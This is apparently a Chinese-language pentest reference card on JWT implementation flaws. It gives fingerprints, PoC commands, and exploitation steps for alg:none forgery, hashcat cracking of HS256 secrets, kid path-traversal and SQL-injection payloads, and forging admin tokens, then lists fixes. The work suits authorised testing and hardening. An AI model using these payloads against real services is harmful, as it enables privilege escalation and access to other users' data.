---
title: JWT 实现缺陷（alg:none / 弱密钥 / 可预测 / kid 注入）
cve: 无（实现缺陷）
severity: high
cvss: 8.1
product: 自研 Web/App 后端（JJWT、java-jwt、PyJWT 等）
versions: 任意
ports: 80, 443
keywords: jwt, alg none, hmac, hashcat 16500, kid, 越权, 提权
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

- 请求头 `Authorization: Bearer eyJ...`，或 Cookie `token=`；
- 解码 payload 见 `{"alg":"HS256","uid":123,"role":"user"}` 之类。

## 前置条件

- 一个普通账号 + 能改自己请求。

## PoC

```bash
# 解码
python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'=='))" <payload>

# 1) alg:none —— 去掉签名
#    header 改 {"alg":"none","typ":"JWT"}，payload 改 uid/role，签名段留空

# 2) HS256 弱密钥爆破
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
#   常见 secret: secret、jwtSecret、xxx2024、公司域名、123456

# 3) kid 注入（服务端用 kid 找密钥文件）
{"alg":"HS256","kid":"../../../../dev/null"}   → 空密钥签名
{"alg":"HS256","kid":"key' UNION SELECT 'known'--"}  → SQL 注入取密钥

# 4) 可预测：payload 里 sub/iat 是时间戳、或 token = md5(uid)
```

## 利用步骤

1. 解 token，记录 `uid`、`role`、`tenant`、`agentId` 这些 claim。
2. 依次试 none → 弱密钥 → kid 注入 → 可预测；任一成功即伪造任意用户。
3. 改 `role=admin` / `uid=1` 重放，观察是否进后台或读到他人数据（与 `api-idor-bola.md` 组合）。
4. 若服务端只校验签名不校验过期（`exp`），可长期复用旧 token。
5. 证据：原始 token（可脱敏尾段）+ 伪造后响应。

## 修复与缓解（加固）

- 密钥强随机（≥32 字节）且定期轮换；优先 RS256/ES256 并固定公钥。
- 服务端强制校验 `alg` 白名单（拒绝 `none`）、`exp`/`iat`/`aud`/`iss`。
- `kid` 只允许白名单键名，禁止拼路径/SQL；密钥不落前端。
- token 短期 + refresh token，敏感操作二次验证。

## 参考

- OWASP JWT Cheat Sheet；PortSwigger JWT 攻击系列。
